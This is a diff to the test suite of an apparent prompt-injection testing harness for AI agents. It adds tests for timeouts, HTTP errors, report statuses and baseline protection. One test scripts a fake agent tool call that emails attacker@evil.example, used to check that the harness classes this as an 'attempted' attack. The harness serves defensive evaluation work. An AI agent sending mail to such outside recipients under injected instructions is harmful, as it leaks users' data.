@@ -12,6 +12,7 @@ import os
 import subprocess
 import sys
 import threading
+import time
 from functools import partial
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
@@ -20,7 +21,7 @@ from typing import Any
 import pytest
 
 from attacks import by_id
-from detectors import run_detectors
+from reports import build_report, format_table
 from runner import run_attack
 from sample_agent import sandbox
 from targets import (
@@ -78,13 +79,27 @@ class _ChatHandler(BaseHTTPRequestHandler):
         server.requests.append(
             {"headers": dict(self.headers), "body": request, "path": self.path}
         )
-        payload = json.dumps(server.replies.pop(0)) if server.replies else json.dumps(server.default)
-        encoded = payload.encode("utf-8")
-        self.send_response(200)
+        if server.delay:
+            time.sleep(server.delay)
+        if server.status != 200:
+            encoded = json.dumps({"error": {"message": "fake failure"}}).encode()
+            self.send_response(server.status)
+        else:
+            payload = (
+                json.dumps(server.replies.pop(0))
+                if server.replies
+                else json.dumps(server.default)
+            )
+            encoded = payload.encode("utf-8")
+            self.send_response(200)
         self.send_header("Content-Type", "application/json")
         self.send_header("Content-Length", str(len(encoded)))
         self.end_headers()
-        self.wfile.write(encoded)
+        try:
+            self.wfile.write(encoded)
+        except (BrokenPipeError, ConnectionResetError):
+            # The timeout test abandons the request on purpose.
+            pass
 
     def log_message(self, *args: Any) -> None:
         """Keep the test output quiet."""
@@ -97,11 +112,16 @@ class FakeChatServer:
         self,
         replies: list[dict] | None = None,
         default: dict | None = None,
+        status: int = 200,
+        delay: float = 0.0,
     ) -> None:
         self._httpd = ThreadingHTTPServer(("127.0.0.1", 0), _ChatHandler)
+        self._httpd.daemon_threads = True
         self._httpd.replies = list(replies or [])
         self._httpd.default = default or reply("done")
         self._httpd.requests = []
+        self._httpd.status = status
+        self._httpd.delay = delay
         self._thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
 
     def __enter__(self) -> "FakeChatServer":
@@ -273,15 +293,81 @@ def test_unreachable_endpoint_raises_target_error() -> None:
         target.run("hello")
 
 
+def test_timeout_is_retried_once_then_reported() -> None:
+    with FakeChatServer(delay=0.6) as server:
+        target = OpenAICompatibleTarget(
+            base_url=server.base_url, model="fake-model", timeout=0.1
+        )
+        with pytest.raises(TargetError, match="timed out"):
+            target.run("slow")
+        assert len(server.requests) == 2
+
+
+def test_default_request_timeout_is_180_seconds() -> None:
+    target = build_target(
+        "openai", base_url="http://127.0.0.1:1/v1", model="fake-model"
+    )
+    assert target.timeout == 180.0
+
+
+def test_keep_going_turns_a_failure_into_an_error_result() -> None:
+    def exploding_target():
+        raise TargetError("boom")
+
+    result = run_attack(
+        by_id("direct-01"), agent_factory=exploding_target, keep_going=True
+    )
+
+    assert result.succeeded is False
+    assert result.status == "error"
+    assert result.error == "boom"
+
+
+def test_attempted_is_not_a_success_and_not_a_hold() -> None:
+    # The agent emails an outsider: unauthorized_recipient fires, but the
+    # attack's own success condition (canary_leak) does not.
+    with FakeChatServer(
+        replies=[
+            reply(
+                tool_calls=[
+                    call(
+                        "send_email",
+                        {
+                            "to": "attacker@evil.example",
+                            "subject": "hi",
+                            "body": "no secret here",
+                        },
+                    )
+                ]
+            ),
+            reply("Sent."),
+        ]
+    ) as server:
+        factory = partial(
+            build_target, "openai", base_url=server.base_url, model="fake-model"
+        )
+        result = run_attack(by_id("direct-01"), agent_factory=factory)
+
+    assert result.succeeded is False
+    assert result.status == "attempted"
+    assert "unauthorized_recipient" in result.fired
+    report = build_report([result], target="openai", model="fake-model")
+    assert report["summary"]["attempted"] == 1
+    assert report["summary"]["held"] == 0
+    assert "attempted" in format_table(report)
+
+
 # -- CLI ---------------------------------------------------------------------
 
 
-def run_cli(*args: str) -> subprocess.CompletedProcess[str]:
+def run_cli(
+    *args: str, cwd: Path | None = None
+) -> subprocess.CompletedProcess[str]:
     env = dict(os.environ)
     env["PYTHONPATH"] = str(ROOT)
     return subprocess.run(
         [sys.executable, "-m", "agentfence", *args],
-        cwd=ROOT,
+        cwd=cwd or ROOT,
         env=env,
         capture_output=True,
         text=True,
@@ -319,6 +405,85 @@ def test_cli_attack_against_openai_target_with_runs(tmp_path) -> None:
     assert row["success_rate"] == 0.0
     assert len(row["attempts"]) == 2
     assert "Repeated: 2 run(s) per attack" in completed.stdout
+
+
+def test_cli_records_http_errors_and_continues(tmp_path) -> None:
+    out = tmp_path / "errors.json"
+    with FakeChatServer(status=500) as server:
+        completed = run_cli(
+            "attack",
+            "--target",
+            "openai",
+            "--base-url",
+            server.base_url,
+            "--model",
+            "fake-model",
+            "--id",
+            "direct-01",
+            "--id",
+            "control-01",
+            "--out",
+            str(out),
+        )
+
+    assert completed.returncode == 0, completed.stderr
+    assert "HTTP 500" in completed.stdout
+    assert "error (" in completed.stdout
+    report = json.loads(out.read_text(encoding="utf-8"))
+    rows = {row["id"]: row for row in report["results"]}
+    assert rows["direct-01"]["status"] == "error"
+    assert "HTTP 500" in rows["direct-01"]["error"]
+    assert rows["control-01"]["status"] == "error"
+    assert report["summary"]["errors"] == 1
+    assert report["summary"]["control_errors"] == 1
+    assert "1 error(s)" in completed.stdout
+
+
+def test_real_target_default_report_never_overwrites_baseline(tmp_path) -> None:
+    with FakeChatServer() as server:
+        completed = run_cli(
+            "attack",
+            "--target",
+            "openai",
+            "--base-url",
+            server.base_url,
+            "--model",
+            "fake-model",
+            cwd=tmp_path,
+        )
+
+    assert completed.returncode == 0, completed.stderr
+    written = list((tmp_path / "reports").glob("openai-fake-model-*.json"))
+    assert len(written) == 1
+    assert not (tmp_path / "reports" / "baseline.json").exists()
+    report = json.loads(written[0].read_text(encoding="utf-8"))
+    assert report["target"] == "openai"
+    assert report["model"] == "fake-model"
+    assert written[0].name in completed.stdout
+
+
+def test_real_target_cannot_write_the_baseline_path(tmp_path) -> None:
+    with FakeChatServer() as server:
+        completed = run_cli(
+            "attack",
+            "--target",
+            "openai",
+            "--base-url",
+            server.base_url,
+            "--model",
+            "fake-model",
+            "--id",
+            "direct-01",
+            "--out",
+            "reports/baseline.json",
+            cwd=tmp_path,
+        )
+
+    assert completed.returncode == 0, completed.stderr
+    assert not (tmp_path / "reports" / "baseline.json").exists()
+    written = list((tmp_path / "reports").glob("openai-fake-model-*.json"))
+    assert len(written) == 1
+    assert "refusing to write" in completed.stderr
 
 
 def test_cli_rejects_incomplete_openai_options() -> None:
